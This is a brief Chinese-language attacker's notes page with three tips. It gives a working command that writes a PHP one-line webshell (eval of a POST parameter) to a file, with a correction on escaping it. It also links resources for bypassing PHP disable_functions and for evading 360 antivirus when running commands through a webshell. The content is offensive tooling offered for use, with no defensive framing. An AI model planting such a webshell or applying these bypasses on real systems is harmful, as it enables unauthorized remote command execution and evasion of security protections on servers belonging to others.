# 01 PHP写入一句话木马时
```
不是
echo "<?php eval($_POST['cmd']);?>">1.php

而是
echo "<?php eval(\$_POST['cmd']);?>">1.php
```

# 02 PHP绕过Disable_Functions
```
https://github.com/mm0r1/exploits/tree/master/php-filter-bypass
```

# 03 Webshell下绕过360执行命令
```
Webshell绕过360主动防御执行命令
https://mp.weixin.qq.com/s/OGwo1zoN1LS3aYalZ_PePw
```